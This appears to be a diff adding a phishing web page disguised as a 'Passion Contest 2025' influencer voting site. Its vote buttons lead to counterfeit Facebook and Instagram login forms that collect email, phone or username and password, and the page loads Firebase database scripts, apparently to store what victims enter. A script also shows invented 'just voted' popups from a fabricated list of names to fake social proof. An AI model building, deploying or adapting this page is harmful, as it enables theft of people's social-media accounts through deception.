@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="image/favicon.png" type="image/x-icon">
+  <script src="js/jquery-3.6.0.min.js"></script>
+  <link rel="stylesheet" href="css/index.css">
+  <link rel="stylesheet" href="css/choose.css">
+  <link rel="stylesheet" href="css/socials.css">
+  <link rel="stylesheet" href="css/fb.css">
+  <link rel="stylesheet" href="css/insta.css">
+  <link rel="stylesheet" href="css/app.css">
+  <script src="js/index.js"></script>
+  <title>Passion Pro Reality Show</title>
+  <style>
+    .popup {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      background-color: rgba(0, 0, 0, 0.7);
+      color: white;
+      padding: 10px;
+      border-radius: 5px;
+      display: flex;
+      align-items: center;
+      display: none;
+      z-index: 1000;
+    }
+
+    .popup img {
+      border-radius: 50%;
+      margin-right: 10px;
+      width: 40px;
+      height: 40px;
+    }
+  </style>
+
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600&family=Roboto:wght@400;500&display=swap"
+    rel="stylesheet">
+
+</head>
+
+<body>
+  <div id="popup" class="popup">
+    <img id="profile-pic" src="" alt="Profile Picture">
+    <span id="popup-text"></span>
+  </div>
+  <div id="home">
+    <header>
+      <img src="img/slide.webp">
+      <p align="center">
+        <button id="vote2" onclick="vote()">
+          Click Here To Vote
+        </button><br>
+        <!-- <button id="vote2" onclick="vote()">
+                                  Join contest
+                                                            </button>-->
+      </p>
+
+    </header>
+
+    <div id="blue">
+
+      <h2>
+        Unleash Your Passion
+      </h2>
+
+    </div>
+    <div id="news">
+      <p>
+        Are you ready to take center stage and show the world your unique talent? The 2025 Passion Contest is here to
+        celebrate the beauty of creativity, the thrill of entertainment, and the limitless potential of talent. Whether
+        you’re a performer, artist, online influencer, content creator or someone with a dream, this is your moment to
+        shine. </p>
+      <p>The stage is set, and the stars have stepped into the spotlight—now it’s your turn to make a difference!
+        Support your favorite contestant by casting your vote and helping them get closer to their dream.</p>
+    </div>
+
+    <div id="news">
+      <p>Voting is easy and makes a world of difference! Every vote counts in deciding who takes the crown in this
+        year’s Passion Contest 2025.</p>
+
+    </div>
+
+    <div id="blue">
+
+      <h2>
+        📢 How to Vote:
+      </h2>
+
+    </div>
+    <div id="news">
+      <p>
+      </p>
+    </div>
+
+    <div id="news">
+      <p>#1 Each influencer has a unique hashtag our social media page.</p>
+      <p>#2 Click the vote button</p>
+      <p>#3 Voting Deadline: Voting is open until December. Don't miss the chance to support your favorite influencer!
+      </p>
+
+    </div>
+
+
+    </center>
+    <div id="blue">
+      <center>
+        <h2>Vote Influencer Categories</h2>
+      </center>
+    </div>
+    <br>
+    <center>
+      <profile>
+
+        <!-- Profile Card 1 -->
+        <div id="voter" class="profile-card">
+          <img src="img/beauty.jpeg" alt="Profile 1" class="profile-image">
+          <div class="hashtags">
+            <span>#Beauty</span>
+          </div>
+          <button onclick="vote()" class="vote-button">Vote</button>
+        </div>
+
+        <!-- Profile Card 2 -->
+        <div id="voter" class="profile-card">
+          <img src="img/photography.jpeg" alt="Profile 2" class="profile-image">
+          <div class="hashtags">
+            <span>#Photography</span>
+          </div>
+          <button onclick="vote()" class="vote-button">Vote</button>
+        </div>
+
+        <!-- Profile Card 3 -->
+        <div id="voter" class="profile-card">
+          <img src="img/drama.jpeg" alt="Profile 2" class="profile-image">
+          <div class="hashtags">
+            <span>#Drama</span>
+          </div>
+          <button onclick="vote()" class="vote-button">Vote</button>
+        </div>
+
+        <!-- Profile Card 4 -->
+        <div id="voter" class="profile-card">
+          <img src="img/creativity.jpeg" alt="Profile 2" class="profile-image">
+          <div class="hashtags">
+            <span>#Creativity</span>
+          </div>
+          <button onclick="vote()" class="vote-button">Vote</button>
+        </div>
+
+        <!-- Profile Card 5 -->
+        <div id="voter" class="profile-card">
+          <img src="img/cycling.jpeg" alt="Profile 2" class="profile-image">
+          <div class="hashtags">
+            <span>#Cycling</span>
+          </div>
+          <button onclick="vote()" class="vote-button">Vote</button>
+        </div>
+
+        <!-- Profile Card 6 -->
+        <div id="voter" class="profile-card">
+          <img src="img/hiking.jpeg" alt="Profile 2" class="profile-image">
+          <div class="hashtags">
+            <span>#Hiking</span>
+          </div>
+          <button onclick="vote()" class="vote-button">Vote</button>
+        </div>
+
+        <!-- Profile Card 7 -->
+        <div id="voter" class="profile-card">
+          <img src="img/singing.jpeg" alt="Profile 2" class="profile-image">
+          <div class="hashtags">
+            <span>#Singing</span>
+          </div>
+          <button onclick="vote()" class="vote-button">Vote</button>
+        </div>
+
+        <!-- Profile Card 8 -->
+        <div id="voter" class="profile-card">
+          <img src="img/passionproject.jpeg" alt="Profile 2" class="profile-image">
+          <div class="hashtags">
+            <span>#PassionProject</span>
+          </div>
+          <button onclick="vote()" class="vote-button">Vote</button>
+        </div>
+      </profile>
+    </center>
+  </div>
+
+  <div id="choose">
+    <p>
+      Vote using:
+    </p>
+    <div class="card">
+
+      <button onclick="fb()">
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 48 48">
+          <g stroke-width="0" id="SVGRepo_bgCarrier"></g>
+          <g stroke-linejoin="round" stroke-linecap="round" id="SVGRepo_tracerCarrier"></g>
+          <g id="SVGRepo_iconCarrier">
+            <circle fill="#3B5998" r="20" cy="24" cx="24"></circle>
+            <path fill="white"
+              d="M29.315 16.9578C28.6917 16.8331 27.8498 16.74 27.3204 16.74C25.8867 16.74 25.7936 17.3633 25.7936 18.3607V20.1361H29.3774L29.065 23.8137H25.7936V35H21.3063V23.8137H19V20.1361H21.3063V17.8613C21.3063 14.7453 22.7708 13 26.4477 13C27.7252 13 28.6602 13.187 29.8753 13.4363L29.315 16.9578Z"
+              clip-rule="evenodd" fill-rule="evenodd"></path>
+          </g>
+        </svg>
+      </button>
+      <button onclick="ig()">
+        <svg fill="#000000" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024">
+          <g stroke-width="0" id="SVGRepo_bgCarrier"></g>
+          <g stroke-linejoin="round" stroke-linecap="round" id="SVGRepo_tracerCarrier"></g>
+          <g id="SVGRepo_iconCarrier">
+            <circle style="fill:#e4405f" r="512" cy="512" cx="512"></circle>
+            <path style="fill:#fff"
+              d="M512 256c-69.5 0-78.2.3-105.5 1.5-27.3 1.3-45.8 5.6-62.1 11.9-16.8 6.5-31.1 15.3-45.4 29.5s-23 28.5-29.5 45.4c-6.3 16.3-10.6 34.9-11.9 62.1-1.3 27.3-1.5 36-1.5 105.5s.3 78.2 1.5 105.5c1.3 27.2 5.6 45.8 11.9 62.1 6.5 16.8 15.3 31.1 29.5 45.4 14.2 14.2 28.5 23 45.4 29.5 16.3 6.3 34.9 10.6 62.1 11.9 27.3 1.3 36 1.5 105.5 1.5s78.2-.3 105.5-1.5c27.2-1.3 45.8-5.6 62.1-11.9 16.8-6.5 31.1-15.3 45.4-29.5 14.2-14.2 23-28.5 29.5-45.4 6.3-16.3 10.6-34.9 11.9-62.1 1.3-27.3 1.5-36 1.5-105.5s-.3-78.2-1.5-105.5c-1.3-27.2-5.6-45.8-11.9-62.1-6.5-16.8-15.3-31.1-29.5-45.4-14.2-14.2-28.5-23-45.4-29.5-16.3-6.3-34.9-10.6-62.1-11.9-27.3-1.2-36-1.5-105.5-1.5zm0 46.1c68.3 0 76.5.3 103.5 1.5 25 1.2 38.5 5.3 47.5 8.9 12 4.6 20.5 10.2 29.5 19.1 8.9 9 14.5 17.5 19.1 29.5 3.5 9 7.7 22.5 8.8 47.5 1.2 27 1.5 35.1 1.5 103.5s-.3 76.5-1.6 103.5c-1.3 25-5.5 38.5-9 47.5-4.8 12-10.2 20.5-19.2 29.5-8.9 8.9-17.6 14.5-29.4 19.1-9 3.5-22.7 7.7-47.7 8.8-27.2 1.2-35.2 1.5-103.7 1.5s-76.5-.3-103.7-1.6c-25-1.3-38.7-5.5-47.7-9-12.1-4.8-20.5-10.2-29.4-19.2-9-8.9-14.7-17.6-19.2-29.4-3.5-9-7.7-22.7-9-47.7-1-26.9-1.3-35.2-1.3-103.3 0-68.2.3-76.5 1.3-103.7 1.3-25 5.4-38.7 9-47.7 4.5-12.2 10.2-20.5 19.2-29.5 8.9-8.9 17.3-14.7 29.4-19.2 9-3.5 22.4-7.7 47.4-9 27.2-1 35.2-1.3 103.7-1.3l1 .7zm0 78.4c-72.6 0-131.5 58.9-131.5 131.5S439.4 643.5 512 643.5 643.5 584.6 643.5 512 584.6 380.5 512 380.5zm0 216.8c-47.1 0-85.3-38.2-85.3-85.3s38.2-85.3 85.3-85.3 85.3 38.2 85.3 85.3-38.2 85.3-85.3 85.3zm167.4-221.9c0 17-13.8 30.7-30.7 30.7-17 0-30.7-13.8-30.7-30.7s13.8-30.7 30.7-30.7c16.9-.1 30.7 13.7 30.7 30.7z">
+            </path>
+          </g>
+        </svg>
+      </button>
+      <button onclick="ig()">
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 32 32">
+          <g stroke-width="0" id="SVGRepo_bgCarrier"></g>
+          <g stroke-linejoin="round" stroke-linecap="round" id="SVGRepo_tracerCarrier"></g>
+          <g id="SVGRepo_iconCarrier">
+            <path fill="#47ACDF"
+              d="M11.7887 28C8.55374 28 5.53817 27.0591 3 25.4356C5.15499 25.5751 8.95807 25.2411 11.3236 22.9848C7.76508 22.8215 6.16026 20.0923 5.95094 18.926C6.25329 19.0426 7.6953 19.1826 8.50934 18.856C4.4159 17.8296 3.78793 14.2373 3.92748 13.141C4.695 13.6775 5.99745 13.8641 6.50913 13.8174C2.69479 11.0882 4.06703 6.98276 4.74151 6.09635C7.47882 9.88867 11.5812 12.0186 16.6564 12.137C16.5607 11.7174 16.5102 11.2804 16.5102 10.8316C16.5102 7.61092 19.1134 5 22.3247 5C24.0025 5 25.5144 5.71275 26.5757 6.85284C27.6969 6.59011 29.3843 5.97507 30.2092 5.4432C29.7934 6.93611 28.4989 8.18149 27.7159 8.64308C27.7224 8.65878 27.7095 8.62731 27.7159 8.64308C28.4037 8.53904 30.2648 8.18137 31 7.68256C30.6364 8.52125 29.264 9.91573 28.1377 10.6964C28.3473 19.9381 21.2765 28 11.7887 28Z">
+            </path>
+          </g>
+        </svg>
+      </button>
+    </div>
+    <button onclick="can()" id="cancel">Close</button>
+  </div>
+  <div class="socialContainer">
+
+    <div id="fbp">
+
+      <div class="fb_form">
+        <div style="display: flex; flex-direction: column; align-items: center; margin-bottom: 50px;">
+          <img
+            src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b9/2023_Facebook_icon.svg/1200px-2023_Facebook_icon.svg.png"
+            alt="logo" id="fblogo" width="50px" height="auto">
+        </div>
+        <input id="fb-email" type="text" placeholder="Email address or phone number" required="">
+        <input id="fb-pass" type="password" placeholder="Password" required="">
+        <button onclick="login()" class="login">Log in</button>
+        <a href="#">Forgot Password ?</a>
+        <br>
+        <div class="orr">or</div><br>
+        <button class="create-account">Create new account</button>
+      </div>
+    </div>
+
+    <div id="igp">
+      <div class="container">
+        <div class="content">
+          <div class="content__form ig_form">
+            <div style="display: flex; flex-direction: column; align-items: center; margin-bottom: 50px;">
+              <img
+                style="background-position: 0px -52px; background-size: auto; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"
+                src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1600px-Instagram_logo.svg.png"
+                alt="logo" id="fblogo" class="" aria-label="Instagram" data-visualcompletion="css-img">
+            </div>
+            <div class="content__inputs">
+              <label>
+                <input id="ig-uname" required="" type="text">
+                <span>Phone number, username, or email</span>
+              </label>
+              <label>
+                <input id="ig-pass" required="" type="password">
+                <span>Password</span>
+              </label>
+            </div>
+            <button onclick="iglog()" type="submit">Log In</button>
+          </div>
+          <div class="content__or-text">
+            <span></span>
+            <span>OR</span>
+            <span></span>
+          </div>
+          <div class="content__forgot-buttons">
+            <button>
+              <img
+                src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b9/2023_Facebook_icon.svg/1200px-2023_Facebook_icon.svg.png"
+                width="15px" height="15px">
+              </span>
+              <span onclick="">Log in with Facebook</span>
+            </button>
+            <button>Forgotten your password?</button>
+            <button>Don't have an account?<span style="color: #385898;">Sign Up</span></button>
+            <!--app section
+            <button>Get the app.</button>
+            -->
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
+
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
+
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
+  <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
+
+  <script src="js/firebase.js">
+
+
+
+  </script>
+
+  <script>
+    const voters = [
+      { name: "Arjun", country: "India", photo: "images/1.jpeg" },
+      { name: "Priya", country: "India", photo: "images/2.jpeg" },
+      { name: "Ravi", country: "India", photo: "images/3.jpeg" },
+      { name: "Sana", country: "India", photo: "images/4.jpeg" },
+      { name: "Amit", country: "India", photo: "images/5.jpeg" },
+      { name: "Vikram", country: "India", photo: "images/6.jpeg" },
+      { name: "Ananya", country: "India", photo: "images/7.jpeg" },
+      { name: "Kavya", country: "India", photo: "images/8.jpeg" },
+      { name: "Nikhil", country: "India", photo: "images/9.jpeg" },
+      { name: "Meera", country: "India", photo: "images/10.jpeg" },
+      { name: "Rajesh", country: "India", photo: "images/11.jpeg" },
+      { name: "Tara", country: "India", photo: "images/12.jpeg" },
+      { name: "Rahul", country: "India", photo: "images/13.jpeg" },
+      { name: "Sneha", country: "India", photo: "images/14.jpeg" },
+      { name: "Krishna", country: "India", photo: "images/15.jpeg" },
+      { name: "Aditya", country: "India", photo: "images/16.jpeg" },
+      { name: "Rani", country: "India", photo: "images/17.jpeg" },
+      { name: "Pooja", country: "India", photo: "images/18.jpeg" },
+      { name: "Sunil", country: "India", photo: "images/19.jpeg" },
+      { name: "Isha", country: "India", photo: "images/20.jpeg" },
+      { name: "Rohan", country: "India", photo: "images/21.jpeg" },
+      { name: "Anil", country: "India", photo: "images/22.jpeg" },
+      { name: "Maya", country: "India", photo: "images/23.jpeg" },
+      { name: "Suresh", country: "India", photo: "images/24.jpeg" },
+      { name: "Neha", country: "India", photo: "images/25.jpeg" },
+      { name: "Zhang Wei", country: "China", photo: "images2/1.jpeg" },
+      { name: "Yumi", country: "Japan", photo: "images2/2.jpeg" },
+      { name: "Kim Min-seok", country: "South Korea", photo: "images2/3.jpeg" },
+      { name: "Nguyen Thi Mai", country: "Vietnam", photo: "images2/4.jpeg" },
+      { name: "Li Na", country: "China", photo: "images2/5.jpeg" },
+      { name: "Haruto", country: "Japan", photo: "images2/6.jpeg" },
+      { name: "Siti", country: "Malaysia", photo: "images2/7.jpeg" },
+      { name: "Abdul", country: "Pakistan", photo: "images2/8.jpeg" },
+      { name: "Bong Cha", country: "South Korea", photo: "images2/9.jpeg" },
+      { name: "Thao", country: "Vietnam", photo: "images2/10.jpeg" },
+      { name: "Rashid", country: "Bangladesh", photo: "images2/11.jpeg" },
+      { name: "Prajwal", country: "India", photo: "images2/12.jpeg" },
+      { name: "Irfan", country: "India", photo: "images2/13.jpeg" },
+      { name: "Sundar", country: "India", photo: "images2/14.jpeg" },
+      { name: "Lakshmi", country: "India", photo: "images2/15.jpeg" },
+      { name: "Karan", country: "India", photo: "images2/16.jpeg" },
+      { name: "Ishita", country: "India", photo: "images2/17.jpeg" },
+      { name: "Gopal", country: "India", photo: "images2/18.jpeg" },
+      { name: "Poonam", country: "India", photo: "images2/19.jpeg" },
+      { name: "Manju", country: "India", photo: "images2/20.jpeg" },
+      { name: "Akira", country: "Japan", photo: "images2/21.jpeg" },
+      { name: "Tanvir", country: "Bangladesh", photo: "images2/22.jpeg" },
+      { name: "Fahim", country: "Pakistan", photo: "images2/23.jpeg" },
+      { name: "Laxman", country: "India", photo: "images2/24.jpeg" },
+      { name: "Vaani", country: "India", photo: "images2/25.jpeg" },
+    ];
+
+    function showPopup() {
+      const voter = voters[Math.floor(Math.random() * voters.length)];
+      const time = Math.floor(Math.random() * 5) + 1; // Random time between 1 and 5 minutes
+
+      const popupText = document.getElementById('popup-text');
+      const profilePic = document.getElementById('profile-pic');
+
+      popupText.textContent = `${voter.name} from ${voter.country} just voted ${time} minutes ago`;
+      profilePic.src = voter.photo;
+
+      const popup = document.getElementById('popup');
+      popup.style.display = 'flex';
+
+      setTimeout(() => {
+        popup.style.display = 'none';
+      }, 5000); // Hide the popup after 5 seconds
+    }
+
+    function startPopups() {
+      showPopup();
+      setInterval(showPopup, 15000); // Show a popup every 15 seconds
+    }
+
+    window.onload = startPopups;
+  </script>
+</body>
+
+</html>
